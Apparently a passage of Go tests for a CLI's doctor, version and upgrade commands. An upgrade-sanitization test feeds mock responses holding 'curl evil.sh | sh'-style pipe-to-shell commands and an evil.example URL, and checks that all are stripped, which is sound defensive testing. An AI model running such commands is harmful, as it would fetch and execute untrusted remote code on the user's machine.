package cli

import (
	"bytes"
	"context"
	"crypto/sha256"
	"database/sql"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime/debug"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/wotjr1649/context-router/internal/ident"
	"github.com/wotjr1649/context-router/internal/session"
	"github.com/wotjr1649/context-router/internal/store"
)

// isolateCodexHome — doctor·설치기 테스트에 각자의 CODEX_HOME을 준다. 호스트 격리가 목적이
// **아니다**: TestMain이 이미 CODEX_HOME을 비우고 HOME·USERPROFILE을 임시로 돌려 실제
// ~/.codex는 닿지 않는다. 결함은 그 임시 홈이 패키지 전체에 공유된다는 것이다 — CODEX_HOME을
// 세우지 않는 설치기 테스트가 쓴 config.toml을 뒤에 도는 doctor 테스트가 읽어, 단정이 실행
// 순서에 종속된다. 돌려주는 경로에 픽스처를 써서 상태를 만든다.
func isolateCodexHome(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	t.Setenv("CODEX_HOME", dir)
	return dir
}

// writeCodexConfig — CODEX_HOME에 config.toml을 쓴다.
func writeCodexConfig(t *testing.T, home, src string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(home, "config.toml"), []byte(src), 0o600); err != nil {
		t.Fatalf("config.toml 쓰기 실패: %v", err)
	}
}

// doctorOut — doctor를 돌려 출력과 오류를 돌려준다. runDoctor의 시그니처를 한 자리에만 두어
// 뒤 태스크가 인자 순서를 되풀이하지 않게 한다.
func doctorOut(t *testing.T, projectRoot string, fix bool) (string, error) {
	t.Helper()
	var buf bytes.Buffer
	err := runDoctor(context.Background(), &buf, t.TempDir(), projectRoot, "0.17.0", fix)
	return buf.String(), err
}

// TestIsolateCodexHome — 격리 헬퍼가 실제로 codexConfigPath를 돌리는가. 뒤 태스크의 doctor
// 단정이 전부 이 헬퍼 위에 서므로, 헬퍼가 조용히 망가지면 그 단정들이 공유 임시 홈을 보게
// 되고 무엇을 단정했는지 알 수 없어진다. 긍정형으로 둔다 — 경로 자체를 단정하면 픽스처가
// 바꾸는 문면뿐 아니라 홈이 어디로 떨어지는지까지 잡는다(반환 디렉터리 아래인지, 거기 쓴
// 픽스처를 doctor가 실제로 읽는지).
func TestIsolateCodexHome(t *testing.T) {
	home := isolateCodexHome(t)
	got, err := codexConfigPath()
	if err != nil {
		t.Fatal(err)
	}
	if want := filepath.Join(home, "config.toml"); got != want {
		t.Fatalf("codexConfigPath = %q, want %q", got, want)
	}
	writeCodexConfig(t, home, "[mcp_servers.ctr]\ncommand = \"context-router\"\n")
	out, _ := doctorOut(t, t.TempDir(), false)
	if !strings.Contains(out, "[16] codex: [mcp_servers.ctr] 테이블=존재") {
		t.Errorf("doctor가 격리된 홈의 픽스처를 읽지 않았다:\n%s", out)
	}
}

// D56 — version 서브커맨드: ProductVersion 1줄만 출력(CI 추출 표면, 스펙 §0).
func TestRunVersionSubcommand(t *testing.T) {
	var out, errOut bytes.Buffer
	err := Run(context.Background(), "version", nil, t.TempDir(), t.TempDir(), "9.9.9-test", false, "", &out, &errOut)
	if err != nil {
		t.Fatalf("err=%v", err)
	}
	if out.String() != "9.9.9-test\n" {
		t.Fatalf("out=%q want %q", out.String(), "9.9.9-test\n")
	}
	if err := Run(context.Background(), "version", []string{"x"}, t.TempDir(), t.TempDir(), "v", false, "", &out, &errOut); err == nil {
		t.Fatal("잉여 인자 미거부")
	}
}

// D56 — formatBuildLine 양 경로(검수 반영 — 순수 포매터라 결정적).
func TestFormatBuildLine(t *testing.T) {
	if got := formatBuildLine("9.9.9-test", nil); got != "[17] build: 9.9.9-test ()" {
		t.Fatalf("nil(실패) 경로: %q", got)
	}
	bi := &debug.BuildInfo{GoVersion: "go1.26.5", Settings: []debug.BuildSetting{
		{Key: "vcs.revision", Value: "abcdef0123456789"},
		{Key: "vcs.modified", Value: "true"},
	}}
	got := formatBuildLine("9.9.9-test", bi)
	for _, want := range []string{"go=go1.26.5", "commit=abcdef012345", "dirty"} {
		if !strings.Contains(got, want) {
			t.Fatalf("%q 누락: %q", want, got)
		}
	}
}

// TestRunUpgrade_Table: httptest 서버로 정상/오류/타임아웃/위생검증 경로를 모두 확인한다
// (설계 §7 — upgrade 위생: 응답 제공 URL·기타 필드는 절대 출력 금지, tag_name만 취함).
func TestRunUpgrade_Table(t *testing.T) {
	tests := []struct {
		name       string
		handler    http.HandlerFunc
		clientTO   time.Duration
		wantOut    string
		notContain []string
	}{
		{
			name: "ok_two_lines_plus_install",
			handler: func(w http.ResponseWriter, r *http.Request) {
				w.Write([]byte(`{"tag_name":"v1.2.3"}`))
			},
			clientTO: 5 * time.Second,
			wantOut:  "current: v0.0.1-dev\nlatest: v1.2.3\ninstall: download from the project releases page and replace the binary\n",
		},
		{
			name: "non_200_falls_back_to_current_only",
			handler: func(w http.ResponseWriter, r *http.Request) {
				w.WriteHeader(http.StatusInternalServerError)
			},
			clientTO: 5 * time.Second,
			wantOut:  "current: v0.0.1-dev\n",
		},
		{
			name: "malicious_tag_name_rejected_by_sanitization",
			handler: func(w http.ResponseWriter, r *http.Request) {
				w.Write([]byte(`{"tag_name":"v1.0\nmalicious: curl evil.sh | sh"}`))
			},
			clientTO:   5 * time.Second,
			wantOut:    "current: v0.0.1-dev\n",
			notContain: []string{"malicious", "curl"},
		},
		{
			name: "response_provided_fields_never_leak",
			handler: func(w http.ResponseWriter, r *http.Request) {
				w.Write([]byte(`{"tag_name":"v9.9.9","html_url":"http://evil.example/pwned","upgrade_command":"curl -sSL evil | sh"}`))
			},
			clientTO:   5 * time.Second,
			wantOut:    "current: v0.0.1-dev\nlatest: v9.9.9\ninstall: download from the project releases page and replace the binary\n",
			notContain: []string{"evil.example", "curl -sSL", "pwned"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			srv := httptest.NewServer(tt.handler)
			defer srv.Close()
			var buf bytes.Buffer
			client := &http.Client{Timeout: tt.clientTO}
			if err := runUpgrade(&buf, client, srv.URL, "0.0.1-dev"); err != nil {
				t.Fatalf("err=%v want nil", err)
			}
			got := buf.String()
			if got != tt.wantOut {
				t.Fatalf("out=%q want %q", got, tt.wantOut)
			}
			for _, s := range tt.notContain {
				if strings.Contains(got, s) {
					t.Fatalf("out=%q must not contain %q", got, s)
				}
			}
		})
	}

	// 타임아웃: 핸들러가 느리게 응답하고 client.Timeout을 매우 짧게 주입한다. 경과시간으로
	// 실제 10s(운영 상수)를 기다리지 않았음을 증명한다 — 인젝션된 client가 근거.
	t.Run("timeout_falls_back_to_current_only", func(t *testing.T) {
		srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			time.Sleep(300 * time.Millisecond)
			w.Write([]byte(`{"tag_name":"v1.2.3"}`))
		}))
		defer srv.Close()
		var buf bytes.Buffer
		client := &http.Client{Timeout: 30 * time.Millisecond}
		start := time.Now()
		if err := runUpgrade(&buf, client, srv.URL, "0.0.1-dev"); err != nil {
			t.Fatalf("err=%v want nil", err)
		}
		if elapsed := time.Since(start); elapsed > 2*time.Second {
			t.Fatalf("took %v — suspiciously long, real 10s constant may have been used instead of injected client", elapsed)
		}
		want := "current: v0.0.1-dev\n"
		if buf.String() != want {
			t.Fatalf("out=%q want %q", buf.String(), want)
		}
	})
}

// TestRunDoctor_Smoke: 미생성 storeRoot(부모만 존재) + 임시 프로젝트 디렉터리로 doctor를
// 실행한다. content.db가 없으므로 "not initialized"가 나와야 하고, err=nil이어야 하며,
// doctor는 store를 생성하면 안 된다(no-create, 설계 §7) — storeRoot 자체도, 프로젝트별
// store 디렉터리도 실행 후 여전히 존재하지 않아야 한다.
func TestRunDoctor_Smoke(t *testing.T) {
	isolateCodexHome(t)
	base := t.TempDir()
	storeRoot := filepath.Join(base, "storeroot") // 의도적 미생성 — 부모(base)만 존재
	projectRoot := filepath.Join(base, "proj")
	if err := os.MkdirAll(filepath.Join(projectRoot, ".git"), 0o755); err != nil {
		t.Fatalf("mkdir project: %v", err)
	}

	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev", false); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	out := buf.String()
	if !strings.Contains(out, canon.ProjectID) {
		t.Fatalf("out missing ProjectID %q: %s", canon.ProjectID, out)
	}
	if !strings.Contains(out, "not initialized") {
		t.Fatalf("out missing 'not initialized': %s", out)
	}
	if !strings.Contains(out, ".mcp.json") {
		t.Fatalf("out missing '.mcp.json' snippet marker: %s", out)
	}

	if _, err := os.Stat(storeRoot); !os.IsNotExist(err) {
		t.Fatalf("store root must not be created by doctor: stat err=%v", err)
	}
	if _, err := os.Stat(filepath.Join(storeRoot, "projects", canon.ProjectID)); !os.IsNotExist(err) {
		t.Fatalf("per-project store dir must not be created by doctor: stat err=%v", err)
	}
}

// TestRunDoctor_InitializedStore: 실제 store.Open(dir,false)+Close로 content.db를 생성한
// 뒤(read-write로 스키마까지 마이그레이션됨) doctor를 read-only로 실행한다. 리뷰에서 발견된
// 버그 — reader가 store.Open(dir,true)의 mode=ro&query_only(ON) 연결이라 예전 fts5 프로브
// (CREATE VIRTUAL TABLE)가 SQLITE_READONLY로 항상 실패하던 것 — 의 회귀를 막는다: err=nil과
// "fts5: 가능" 출력을 직접 검증한다(TestRunDoctor_Smoke는 미초기화 분기만 커버해 이 버그를
// 가렸었다).
func TestRunDoctor_InitializedStore(t *testing.T) {
	isolateCodexHome(t)
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	if err := os.MkdirAll(filepath.Join(projectRoot, ".git"), 0o755); err != nil {
		t.Fatalf("mkdir project: %v", err)
	}
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}

	st, err := store.Open(filepath.Join(storeRoot, "projects", canon.ProjectID), false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("store.Close: %v", err)
	}

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev", false); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	out := buf.String()
	if !strings.Contains(out, "user_version=1 quick_check=ok") {
		t.Fatalf("out missing content.db quick_check=ok: %s", out)
	}
	if !strings.Contains(out, "[4] fts5: 가능") {
		t.Fatalf("out missing fts5 available on an initialized (read-only-probed) store: %s", out)
	}
}

// TestRunDoctor_ContentDBSize: D33a [14] — content.db 규모 행이 sources·artifacts 행수와
// artifacts/ CAS 물리 blob 바이트의 정확값을 방출한다. fixture: 인덱스 아티팩트 2개(길이 10·15,
// 상이) + raw blob 2회 기록(동일 20B 콘텐츠 → dedup으로 물리 1파일). blob 바이트는 물리 파일
// 합산이라 10+15+20=45 — DB 파일 크기 합산이나 0 방출 오구현, dedup 미반영(65) 오구현을 걸러낸다.
func TestRunDoctor_ContentDBSize(t *testing.T) {
	isolateCodexHome(t)
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
	st, err := store.Open(projDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	raw := []byte(strings.Repeat("R", 20)) // 두 소스가 공유하는 원본 blob(20B) — 물리 dedup 검증용
	reg := func(uri, idx string) {
		if _, err := st.Register(context.Background(), store.Registration{
			StoredBytes: []byte(idx), MediaType: "text/plain",
			Source:  store.SourceMeta{URI: uri, Kind: "file", SrcHash: uri},
			Chunks:  []store.Chunk{{Ordinal: 0, Text: idx}},
			RawBlob: raw,
		}); err != nil {
			t.Fatalf("register %s: %v", uri, err)
		}
	}
	reg("/src-a", strings.Repeat("a", 10)) // 인덱스 콘텐츠 A(10B)
	reg("/src-b", strings.Repeat("b", 15)) // 인덱스 콘텐츠 B(15B) — A와 상이 → artifacts=2
	if err := st.Close(); err != nil {
		t.Fatalf("store.Close: %v", err)
	}

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev", false); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	if !strings.Contains(buf.String(), "[14] content.db: sources=2 artifacts=2 blob=45B") {
		t.Fatalf("out missing exact content.db size line:\n%s", buf.String())
	}
	// D40 — content.db 파일 실크기 병기(FileBytes). 값은 페이지/WAL에 따라 가변이라 접미 존재만 단정.
	if !strings.Contains(buf.String(), " file=") {
		t.Fatalf("out missing content.db file= suffix:\n%s", buf.String())
	}
}

// D38 — blob 총량 > 임계면 [14] 뒤 경고 1줄(purge 비선택 성격 병기), 임계 미만이면 무출력.
// SizeStats 실패("없음") 경로는 else 분기 밖이라 경고 미평가가 구조로 보장된다(기존 테스트 커버).
// 셋업·호출은 TestRunDoctor_ContentDBSize 관례.
func doctorSizeWarnSetup(t *testing.T) (storeRoot, projectRoot string) {
	t.Helper()
	// 부모 env의 임계 키 누수 시 무경고 단정이 거짓 실패(Codex P2) — 양 축을 기본값으로
	// 고정(""=기본 폴백, 개별 테스트의 후행 t.Setenv가 덮어씀).
	t.Setenv("CTR_STORE_WARN_BYTES", "")
	t.Setenv("CTR_CONTENT_FILE_WARN_BYTES", "")
	storeRoot, projectRoot = t.TempDir(), t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	st, err := store.Open(filepath.Join(storeRoot, "projects", canon.ProjectID), false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	if _, err := st.Register(context.Background(), store.Registration{
		StoredBytes: []byte(strings.Repeat("a", 10)), MediaType: "text/plain",
		Source: store.SourceMeta{URI: "/src-a", Kind: "file", SrcHash: "/src-a"},
		Chunks: []store.Chunk{{Ordinal: 0, Text: strings.Repeat("a", 10)}},
	}); err != nil {
		t.Fatalf("register: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("store.Close: %v", err)
	}
	return storeRoot, projectRoot
}

// D38 — storeWarnBytes 오버라이드 채택 규칙 직접 단정(v0.4 최종 리뷰 이월): 양수만 채택,
// 비양수·파싱 실패·미설정은 기본값(100MiB) 폴백.
func TestStoreWarnBytes(t *testing.T) {
	cases := []struct {
		env  string
		want int64
	}{
		{"5", 5},
		{"0", defaultStoreWarnBytes},
		{"-1", defaultStoreWarnBytes},
		{"abc", defaultStoreWarnBytes},
		{"", defaultStoreWarnBytes},
	}
	for _, c := range cases {
		getenv := func(k string) string { // 키 대조 — 신규 env명을 정확히 읽는지가 단정의 일부
			if k == "CTR_STORE_WARN_BYTES" {
				return c.env
			}
			return ""
		}
		if got := storeWarnBytes(getenv); got != c.want {
			t.Fatalf("storeWarnBytes(env=%q)=%d want %d", c.env, got, c.want)
		}
	}
}

func TestRunDoctor_StoreSizeWarn(t *testing.T) {
	isolateCodexHome(t)
	storeRoot, projectRoot := doctorSizeWarnSetup(t)
	t.Setenv("CTR_STORE_WARN_BYTES", "5") // blob 10B > 5B → 발화
	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev", false); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	for _, want := range []string{"[14] warning:", "purge", "--hook-only"} {
		if !strings.Contains(buf.String(), want) {
			t.Fatalf("out missing %q:\n%s", want, buf.String())
		}
	}
}

func TestRunDoctor_StoreSizeWarnSilentUnderThreshold(t *testing.T) {
	isolateCodexHome(t)
	storeRoot, projectRoot := doctorSizeWarnSetup(t) // 임계 미설정 — 기본 100MiB
	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev", false); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	if !strings.Contains(buf.String(), "[14] content.db: sources=1 artifacts=1 blob=10B") {
		t.Fatalf("out missing exact [14] line(무회귀):\n%s", buf.String())
	}
	if strings.Contains(buf.String(), "[14] warning") {
		t.Fatalf("경고가 임계 미만에서 발화:\n%s", buf.String())
	}
}

// TestRunDoctor_ContentFileWarn — D46 발화: 전용 키만 소액 설정 — content.db 파일은 항상 >1B.
// 픽스처·doctor 실행부는 TestRunDoctor_StoreSizeWarn과 동일. 역방향 축 독립(file 키 조정 시
// blob 침묵)도 여기서 단정 — AxisIndependent 테스트의 blob→file 방향과 쌍.
func TestRunDoctor_ContentFileWarn(t *testing.T) {
	isolateCodexHome(t)
	storeRoot, projectRoot := doctorSizeWarnSetup(t)
	t.Setenv("CTR_CONTENT_FILE_WARN_BYTES", "1")
	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev", false); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	out := buf.String()
	if !strings.Contains(out, "[14] warning: file ") || !strings.Contains(out, "CTR_CONTENT_FILE_WARN_BYTES") {
		t.Fatalf("파일 축 경고 미발화:\n%s", out)
	}
	if strings.Contains(out, "[14] warning: blob ") {
		t.Fatalf("file 키 조정이 blob 축 경고를 발화(키 분리 위반):\n%s", out)
	}
}

// TestRunDoctor_ContentFileWarnAxisIndependent — D46 축 독립: blob 키만 낮추면 blob 경고만
// 발화하고 파일 경고는 기본 100MiB 임계라 침묵한다(소형 픽스처 ≪ 100MiB — 전용 키 분리 판별).
func TestRunDoctor_ContentFileWarnAxisIndependent(t *testing.T) {
	isolateCodexHome(t)
	storeRoot, projectRoot := doctorSizeWarnSetup(t)
	t.Setenv("CTR_STORE_WARN_BYTES", "1")
	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev", false); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	out := buf.String()
	if !strings.Contains(out, "[14] warning: blob ") {
		t.Fatalf("blob 경고 미발화:\n%s", out)
	}
	if strings.Contains(out, "[14] warning: file ") {
		t.Fatalf("blob 키 조정이 파일 축 경고를 발화(키 분리 위반):\n%s", out)
	}
}

// TestContentFileWarnBytes — CTR_CONTENT_FILE_WARN_BYTES 양수만 채택(storeWarnBytes와 동형).
func TestContentFileWarnBytes(t *testing.T) {
	if got := contentFileWarnBytes(func(string) string { return "" }); got != 100<<20 {
		t.Fatalf("기본값: %d", got)
	}
	if got := contentFileWarnBytes(func(string) string { return "12345" }); got != 12345 {
		t.Fatalf("env 채택: %d", got)
	}
	if got := contentFileWarnBytes(func(string) string { return "-1" }); got != 100<<20 {
		t.Fatalf("비양수 거부: %d", got)
	}
}

// seedShadowContentDB — projDir/content.db에 hook 단독(귀속) 아티팩트 1개 + file(비귀속) 1개를
// Register하고 귀속 hash(=hex(sha256(hookContent))=CAS 파일명=ShadowOwned 키)를 반환한다.
func seedShadowContentDB(t *testing.T, projDir string) (ownedHash string) {
	t.Helper()
	st, err := store.Open(projDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	const hookContent = "hook-only-shadow-content"
	if _, err := st.Register(context.Background(), store.Registration{
		StoredBytes: []byte(hookContent), MediaType: "text/plain",
		Source: store.SourceMeta{URI: "shadow:Bash:1", Kind: "hook", SrcHash: "sh-hook"},
	}); err != nil {
		t.Fatalf("register hook: %v", err)
	}
	if _, err := st.Register(context.Background(), store.Registration{ // 비귀속(file 직접 참조) — 버킷에 안 들어가야 함
		StoredBytes: []byte("explicit-file-content"), MediaType: "text/plain",
		Source: store.SourceMeta{URI: "/tmp/f.txt", Kind: "file", SrcHash: "sh-file"},
	}); err != nil {
		t.Fatalf("register file: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("store.Close: %v", err)
	}
	sum := sha256.Sum256([]byte(hookContent))
	return hex.EncodeToString(sum[:])
}

// seedShadowWorktree — wdir에 정상 session.db를 부트스트랩(session.Open)한 뒤 지정 session_id로
// artifact_created 이벤트 1건을 raw INSERT한다. session_id 접두(cc:/cx:)를 통제해야 하는데
// session.Open은 서버 UUID를 발급하므로 공개 API로는 만들 수 없다 — 실제 훅 경로(dispatch)도
// ExternalSessionID 접두 session_id로 append한다. artifact_refs는 정본 URI JSON 배열.
func seedShadowWorktree(t *testing.T, wdir, sid string, refs []string) {
	t.Helper()
	d, err := session.Open(wdir, session.Options{Producer: "context-router/test"})
	if err != nil {
		t.Fatalf("session.Open(%s): %v", wdir, err)
	}
	if err := d.Close(); err != nil {
		t.Fatalf("session.Close: %v", err)
	}
	dbPath := filepath.ToSlash(filepath.Join(wdir, "session.db"))
	db, err := sql.Open("sqlite", "file:"+dbPath+"?_pragma=busy_timeout(5000)")
	if err != nil {
		t.Fatalf("open session.db rw: %v", err)
	}
	defer func() { _ = db.Close() }()
	refsJSON, err := json.Marshal(refs)
	if err != nil {
		t.Fatalf("marshal refs: %v", err)
	}
	if _, err := db.Exec(`INSERT INTO session_events(event_id, session_id, event_type, ts, summary, artifact_refs, redaction)
		VALUES(?,?,?,?,?,?,?)`, "evt-"+sid, sid, "artifact_created", int64(1700000000), "seeded shadow", string(refsJSON), "none"); err != nil {
		t.Fatalf("insert artifact_created: %v", err)
	}
	if _, err := db.Exec("PRAGMA wal_checkpoint(TRUNCATE)"); err != nil { // ro doctor가 결정적으로 보게 flush
		t.Fatalf("checkpoint: %v", err)
	}
}

// TestDoctorShadowOwnedLine — D40 §2: [15] 접두 분해. hook 단독(귀속) hash를 cc: 세션이
// artifact_created로 참조 → cc: 버킷. 비귀속(file) ref는 귀속 hash가 아니라 무시된다.
func TestDoctorShadowOwnedLine(t *testing.T) {
	isolateCodexHome(t)
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
	ownedHash := seedShadowContentDB(t, projDir)

	sid := "cc:00000000-0000-7000-8000-0000000000aa"
	seedShadowWorktree(t, filepath.Join(projDir, "worktrees", "wt1"), sid, []string{
		"artifact://" + sid + "/sha256-" + ownedHash,               // 귀속 → cc: 버킷
		"artifact://" + sid + "/sha256-" + strings.Repeat("e", 64), // 비귀속 → 무시
	})

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev", false); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	out := buf.String()
	for _, want := range []string{"[15] shadow-owned: ", "cc:=", "hashes=1", "cx:=0B shared=0B unattributed=0B"} {
		if !strings.Contains(out, want) {
			t.Fatalf("doctor 출력에 %q 없음:\n%s", want, out)
		}
	}
	if strings.Contains(out, "세션 분해 없음") || strings.Contains(out, "incomplete") {
		t.Fatalf("정상 경로인데 '세션 분해 없음'/'incomplete' 병기:\n%s", out)
	}
}

// TestDoctorShadowOwnedIncomplete — 손상 session.db 1개가 섞여도 그 worktree만 건너뛰고 괄호
// 끝에 incomplete를 병기하며, [15] 실패는 doctor 전역 failed에 안 들어가 성공 종료한다.
func TestDoctorShadowOwnedIncomplete(t *testing.T) {
	isolateCodexHome(t)
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)

	// 정상 worktree 1개(비어 있어도 열림 → usable≥1이어야 incomplete 형식이 나온다).
	d, err := session.Open(filepath.Join(projDir, "worktrees", "ok"), session.Options{Producer: "context-router/test"})
	if err != nil {
		t.Fatalf("session.Open ok: %v", err)
	}
	if err := d.Close(); err != nil {
		t.Fatalf("session.Close ok: %v", err)
	}

	// 손상 worktree: 0xEE 4096B session.db(SQLITE_NOTADB) — 첫 쿼리에서 오류(TestSessionRuntimeStorageErrorMapsToStorageUnavailable와 동형).
	corrupt := filepath.Join(projDir, "worktrees", "corrupt")
	if err := os.MkdirAll(corrupt, 0o755); err != nil {
		t.Fatalf("mkdir corrupt: %v", err)
	}
	if err := os.WriteFile(filepath.Join(corrupt, "session.db"), bytes.Repeat([]byte{0xEE}, 4096), 0o600); err != nil {
		t.Fatalf("write corrupt session.db: %v", err)
	}

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev", false); err != nil {
		t.Fatalf("runDoctor err=%v ([15] 실패가 전역 failed로 새면 안 됨) out=%s", err, buf.String())
	}
	out := buf.String()
	if !strings.Contains(out, "[15] shadow-owned: ") || !strings.Contains(out, "incomplete") {
		t.Fatalf("incomplete 병기 없음:\n%s", out)
	}
	if strings.Contains(out, "세션 분해 없음") {
		t.Fatalf("usable worktree가 있는데 '세션 분해 없음':\n%s", out)
	}
}

// doctorShadowProjDir — [15] 분해 테스트 공용 셋업: (storeRoot, projectRoot, projDir).
func doctorShadowProjDir(t *testing.T) (storeRoot, projectRoot, projDir string) {
	t.Helper()
	storeRoot = t.TempDir()
	projectRoot = t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir = filepath.Join(storeRoot, "projects", canon.ProjectID)
	return
}

// TestDoctorShadowOwnedShared — D40 §2: 같은 귀속 hash를 cc:·cx: 세션이 함께 참조하면(한 worktree
// 내 두 세션) shared 버킷으로 집계되고 cc:/cx:/unattributed는 0이다.
func TestDoctorShadowOwnedShared(t *testing.T) {
	isolateCodexHome(t)
	storeRoot, projectRoot, projDir := doctorShadowProjDir(t)
	ownedHash := seedShadowContentDB(t, projDir)

	ccSid := "cc:00000000-0000-7000-8000-0000000000aa"
	cxSid := "cx:00000000-0000-7000-8000-0000000000bb"
	wt := filepath.Join(projDir, "worktrees", "wt1")
	seedShadowWorktree(t, wt, ccSid, []string{"artifact://" + ccSid + "/sha256-" + ownedHash})
	seedShadowWorktree(t, wt, cxSid, []string{"artifact://" + cxSid + "/sha256-" + ownedHash})

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev", false); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	out := buf.String()
	for _, want := range []string{"[15] shadow-owned: ", "hashes=1", "cc:=0B cx:=0B shared=", "unattributed=0B"} {
		if !strings.Contains(out, want) {
			t.Fatalf("shared 버킷 출력에 %q 없음:\n%s", want, out)
		}
	}
	if strings.Contains(out, "shared=0B") || strings.Contains(out, "incomplete") || strings.Contains(out, "세션 분해 없음") {
		t.Fatalf("shared 집계 실패(shared=0B/incomplete/분해없음):\n%s", out)
	}
}

// TestDoctorShadowOwnedUnattributed — D40 §2: 귀속 hash가 어느 세션에도 참조되지 않으면(세션은
// 있으나 비귀속 hash만 참조) unattributed 버킷으로 집계된다(usable≥1이라 폴백 아님).
func TestDoctorShadowOwnedUnattributed(t *testing.T) {
	isolateCodexHome(t)
	storeRoot, projectRoot, projDir := doctorShadowProjDir(t)
	seedShadowContentDB(t, projDir) // ownedHash 존재하나 아래 세션은 참조하지 않음

	sid := "cc:00000000-0000-7000-8000-0000000000aa"
	wt := filepath.Join(projDir, "worktrees", "wt1")
	seedShadowWorktree(t, wt, sid, []string{"artifact://" + sid + "/sha256-" + strings.Repeat("d", 64)}) // 비귀속 hash

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev", false); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	out := buf.String()
	if !strings.Contains(out, "cc:=0B cx:=0B shared=0B unattributed=") {
		t.Fatalf("unattributed 버킷 형식 아님:\n%s", out)
	}
	if strings.Contains(out, "unattributed=0B") || strings.Contains(out, "세션 분해 없음") {
		t.Fatalf("귀속 hash가 unattributed로 집계되지 않음:\n%s", out)
	}
}

// TestDoctorShadowOwnedMultiWorktree — D40 §2: worktree 2개의 세션 데이터가 합산된다. wt1(cc:)과
// wt2(cx:)가 각각 같은 hash를 참조 → shared는 두 worktree를 모두 순회해 접두를 병합했을 때에만
// 나온다(한쪽만 읽으면 cc:/cx: 단독). shared 결과가 곧 다중 worktree 합산의 증거.
func TestDoctorShadowOwnedMultiWorktree(t *testing.T) {
	isolateCodexHome(t)
	storeRoot, projectRoot, projDir := doctorShadowProjDir(t)
	ownedHash := seedShadowContentDB(t, projDir)

	ccSid := "cc:00000000-0000-7000-8000-0000000000aa"
	cxSid := "cx:00000000-0000-7000-8000-0000000000bb"
	seedShadowWorktree(t, filepath.Join(projDir, "worktrees", "wt1"), ccSid, []string{"artifact://" + ccSid + "/sha256-" + ownedHash})
	seedShadowWorktree(t, filepath.Join(projDir, "worktrees", "wt2"), cxSid, []string{"artifact://" + cxSid + "/sha256-" + ownedHash})

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev", false); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	out := buf.String()
	if !strings.Contains(out, "cc:=0B cx:=0B shared=") || strings.Contains(out, "shared=0B") {
		t.Fatalf("2개 worktree 접두 병합(shared) 실패:\n%s", out)
	}
	if strings.Contains(out, "incomplete") || strings.Contains(out, "세션 분해 없음") {
		t.Fatalf("정상 2-worktree 경로인데 incomplete/분해없음:\n%s", out)
	}
}

// TestDoctorShadowOwnedNoSessionDecomp — D40 §2: content.db는 있으나 worktrees 세션이 하나도
// 없으면(usable=0) [15]는 버킷 분해 없이 '세션 분해 없음' 폴백으로 렌더한다(runDoctor의 usable=0 분기).
